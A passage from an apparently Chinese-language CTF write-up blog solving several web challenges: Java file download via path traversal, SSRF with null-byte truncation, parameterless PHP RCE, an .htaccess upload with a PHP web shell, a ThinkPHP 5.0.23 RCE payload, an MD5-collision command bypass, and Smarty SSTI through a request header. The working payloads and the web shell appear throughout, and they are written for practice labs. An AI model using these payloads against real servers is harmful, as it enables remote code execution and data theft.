class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">web-app</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">version</span>=<span class=\"string\">&quot;4.0&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">welcome-file-list</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">welcome-file</span>&gt;</span>Index<span class=\"tag\">&lt;/<span class=\"name\">welcome-file</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">welcome-file-list</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>IndexController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>IndexController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Index<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>LoginController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>LoginController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Login<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>DownloadController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>DownloadController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Download<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>FlagController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>FlagController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Flag<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>注意到了一个<code>FlagController</code>的控制器，它所在的类为<code>com.wm.ctf.FlagController</code>，前面也提到了编译文件所在的文件夹<code>/WEB-INF/classes/</code>，去这个文件夹下载<code>FlagController</code>相关的文件，还需要知道的是：Javaweb程序编译文件的目录结构是根据类名创建的，类名我们也知道了，所以下载：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>\n\n<p>class文件源码好多不可见字符</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310112205.png\"></p>\n<p>我选中的那段就是flag在的地方，看到了<code>==</code>就应该意识到是base64编码，但是base64编码里没有<code>&lt;</code>这个字符，所以flag的密文就是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ZmxhZ3s0NmNhMTExMS01ZjI5LTQwYjMtYjUwMC1lYWMzZjkyMjU4ODF9Cg==</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"———————–以下部分施工中👷‍♂️————————\"><a href=\"#———————–以下部分施工中👷‍♂️————————\" class=\"headerlink\" title=\"———————–以下部分施工中👷‍♂️————————\"></a>———————–以下部分施工中👷‍♂️————————</h1><p>下面的都是没有整理，先把重要思路写下来了，然后有时间再配图</p>\n<hr>\n<h1 id=\"GKCTF2020-cve版签到\"><a href=\"#GKCTF2020-cve版签到\" class=\"headerlink\" title=\"[GKCTF2020]cve版签到\"></a>[GKCTF2020]cve版签到</h1><p><a href=\"https://blog.csdn.net/qq_45521281/article/details/106425266\">CVE-2020-7066</a></p>\n<p>只有一个按钮，点击以后查看网页的Network请求中有一个</p>\n<blockquote>\n<p>Hint: Flag in localhost</p>\n</blockquote>\n<p>且utl地址中有可控的参数，所以应该是使用ssrf。这里还有一个提示是在主页面那里</p>\n<blockquote>\n<p>You just view *.ctfhub.com</p>\n</blockquote>\n<p>只可以访问以ctfhub.com结尾的网站，再根据cve使用%00截断访问：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=http://127.0.0.1%00.ctfhub.com</span><br></pre></td></tr></table></figure>\n\n<p>第二个提示：</p>\n<blockquote>\n<p>Host must be end with ‘123’</p>\n</blockquote>\n<p>必须以123结尾，所以最终payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=http://127.0.0.123%00.ctfhub.com</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"GXYCTF2019-禁止套娃\"><a href=\"#GXYCTF2019-禁止套娃\" class=\"headerlink\" title=\"[GXYCTF2019]禁止套娃\"></a>[GXYCTF2019]禁止套娃</h1><p>git泄露。我使用的<a href=\"https://github.com/gakki429/Git_Extract\">https://github.com/gakki429/Git_Extract</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class=\"line\">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class=\"line\">    if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class=\"line\">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class=\"line\">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class=\"line\">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class=\"line\">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            else&#123;</span><br><span class=\"line\">                die(&quot;还差一点哦！&quot;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            die(&quot;再好好想想！&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// highlight_file(__FILE__);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>正则表达式匹配的只有函数的形式如<code>var_dump();</code>是一道<a href=\"https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/\">无参数RCE</a>，看的题解自己整理的payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?exp=var_dump(readfile(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>\n\n<p>一层一层解释：</p>\n<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组</p>\n<p><strong>图片展示</strong></p>\n<p>current() 返回数组中的当前单元, 默认取第一个值。别名pos()</p>\n<p>到这里获得的是一个点</p>\n<p>scandir() 遍历目录，是<code>.</code>的话就是列出当前目录。</p>\n<p>此时输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这时的输出还是键值对的形式，我们需要使用<code>array_flip()</code>函数交换键值对，然后使用随机函数<code>array_rand()</code>从数组中随机取出一个或多个单元。因为正则的原因无法使用<code>file_get_contents()</code>，但是还有其他读取文件的函数:readfile()、highlight_file()和它的别名函数show_source()。</p>\n<hr>\n<h1 id=\"GXYCTF2019-BabyUpload\"><a href=\"#GXYCTF2019-BabyUpload\" class=\"headerlink\" title=\"[GXYCTF2019]BabyUpload\"></a>[GXYCTF2019]BabyUpload</h1><p>ph过滤，image/gif不能通过。image/jpe可以</p>\n<p>上传.htaccess</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>\n\n<p>上传码，但是不能是php代码，使用js</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>完工</p>\n<hr>\n<h1 id=\"BJDCTF-2nd-old-hack\"><a href=\"#BJDCTF-2nd-old-hack\" class=\"headerlink\" title=\"[BJDCTF 2nd]old-hack\"></a>[BJDCTF 2nd]old-hack</h1><p>ThinkPHP的<a href=\"https://blog.csdn.net/qq_38807738/article/details/86777541\">漏洞</a></p>\n<p>ThinkPHP5 5.0.23</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /flag</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"安洵杯-2019-easy-web\"><a href=\"#安洵杯-2019-easy-web\" class=\"headerlink\" title=\"[安洵杯 2019]easy_web\"></a>[安洵杯 2019]easy_web</h1><p>看url一个img和cmd，页面中有一个图片的标签，和一个**md5 is funny ~**。把url中img的值进行解码发现图片名为<code>555.png</code>，尝试用同样的编码方式读取index.php，加密的编码依次为：hex–&gt;base64–&gt;base64。</p>\n<p>index.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class=\"line\">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class=\"line\">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class=\"line\">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class=\"line\">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class=\"line\">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class=\"line\"></span><br><span class=\"line\">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class=\"line\">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class=\"line\">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class=\"line\">    die(&quot;xixi～ no flag&quot;);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    $txt = base64_encode(file_get_contents($file));</span><br><span class=\"line\">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo $cmd;</span><br><span class=\"line\">echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class=\"line\">    echo(&quot;forbid ~&quot;);</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class=\"line\">        echo `$cmd`;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        echo (&quot;md5 is funny ~&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">  body&#123;</span><br><span class=\"line\">   background:url(./bj.png)  no-repeat center center;</span><br><span class=\"line\">   background-size:cover;</span><br><span class=\"line\">   background-attachment:fixed;</span><br><span class=\"line\">   background-color:#CCCCCC;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>我不知道为什么，我的bp一定要在<code>&amp;</code>前加一个空格才可以通过。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?cmd=uniq%20/flag</span><br><span class=\"line\"></span><br><span class=\"line\">POST</span><br><span class=\"line\">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class=\"line\">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>\n\n<p>读文件的绕过有</p>\n<blockquote>\n<table>\n<thead>\n<tr>\n<th align=\"center\">1</th>\n<th>more:一页一页的显示档案内容</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">2</td>\n<td>less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</td>\n</tr>\n<tr>\n<td align=\"center\">3</td>\n<td>head:查看头几行</td>\n</tr>\n<tr>\n<td align=\"center\">4</td>\n<td>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</td>\n</tr>\n<tr>\n<td align=\"center\">5</td>\n<td>tail:查看尾几行</td>\n</tr>\n<tr>\n<td align=\"center\">6</td>\n<td>nl：显示的时候，顺便输出行号</td>\n</tr>\n<tr>\n<td align=\"center\">7</td>\n<td>od:以二进制的方式读取档案内容</td>\n</tr>\n<tr>\n<td align=\"center\">8</td>\n<td>vi:一种编辑器，这个也可以查看</td>\n</tr>\n<tr>\n<td align=\"center\">9</td>\n<td>vim:一种编辑器，这个也可以查看</td>\n</tr>\n<tr>\n<td align=\"center\">10</td>\n<td>sort:可以查看</td>\n</tr>\n<tr>\n<td align=\"center\">11</td>\n<td>uniq:可以查看</td>\n</tr>\n<tr>\n<td align=\"center\">12</td>\n<td>file -f:报错出具体内容</td>\n</tr>\n</tbody></table>\n</blockquote>\n<p>摘自<a href=\"https://www.ghtwf01.cn/index.php/archives/273/\">命令执行漏洞利用及绕过方式总结</a>。</p>\n<hr>\n<h1 id=\"BJDCTF2020-Mark-loves-cat\"><a href=\"#BJDCTF2020-Mark-loves-cat\" class=\"headerlink\" title=\"[BJDCTF2020]Mark loves cat\"></a>[BJDCTF2020]Mark loves cat</h1><p>git泄露</p>\n<p>flag.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$flag = file_get_contents(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p>index.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">include &#x27;flag.php&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">$yds = &quot;dog&quot;;</span><br><span class=\"line\">$is = &quot;cat&quot;;</span><br><span class=\"line\">$handsome = &#x27;yds&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class=\"line\">    $$x = $y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class=\"line\">    $$x = $$y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class=\"line\">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;</span><br><span class=\"line\">        exit($handsome);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;</span><br><span class=\"line\">    exit($yds); </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;</span><br><span class=\"line\">    exit($is);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure>\n\n<p>尝试输出<code>$flag</code>即可。exit()函数退出时也会输出。</p>\n<p>第一个不可能实现，如果POST或GET传入flag的话必然导致<code>$flag</code>修改，那么正好符合第二个if。</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET</span><br><span class=\"line\">?yds=flag</span><br><span class=\"line\"></span><br><span class=\"line\">POST(任意，但是需要保证不传flag)</span><br><span class=\"line\">is=233flag</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"BJDCTF2020-The-mystery-of-ip\"><a href=\"#BJDCTF2020-The-mystery-of-ip\" class=\"headerlink\" title=\"[BJDCTF2020]The mystery of ip\"></a>[BJDCTF2020]The mystery of ip</h1><p>hint.php里面有注释</p>\n<blockquote>\n<p>Do you know why i know your ip?</p>\n</blockquote>\n<p>去flag.php尝试加入请求头x-forward-x、client-ip发现ip可以改变。然后是自己感觉网页很简单，突破点在请求头中，尝试了下ssti模板注入，发现成功了。</p>\n<p>尝试了几个ssti的payload不行，但是提示了</p>\n<blockquote>\n<p>Uncaught –&gt; Smarty Compiler:…………………</p>\n</blockquote>\n<p>得知了这个是Smarty引擎，在网上尝试搜索这种类型的注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">请求：</span><br><span class=\"line\">X-Forwarded-For: &#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><a href=\"https://github.com/epinna/tplmap\">SSTI神器–Tplmap</a>，看介绍是和sqlmap差不多的工具。</p>\n<p>这个师傅的博客写的很全：<a href=\"https://www.cnblogs.com/R3col/p/12746485.html%EF%BC%8C%E6%89%80%E6%9C%89%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8Epayload%E9%83%BD%E6%9C%89%EF%BC%8C%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%89%8D%E9%9C%80%E8%A6%81%E5%85%88%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B%E3%80%82\">https://www.cnblogs.com/R3col/p/12746485.html，所有类型的模板引擎payload都有，注入之前需要先确定类型。</a></p>\n<p><a href=\"https://www.cnblogs.com/20175211lyz/p/11425368.html\">CTF SSTI(服务器模板注入)</a></p>\n<p><a href=\"https://xz.aliyun.com/t/3679/\">flask之ssti模版注入从零到入门</a></p>\n<hr>\n<h1 id=\"GWCTF-2019-我有一个数据库\"><a href=\"#GWCTF-2019-我有一个数据库\" class=\"headerlink\" title=\"[GWCTF 2019]我有一个数据库\"></a>[GWCTF 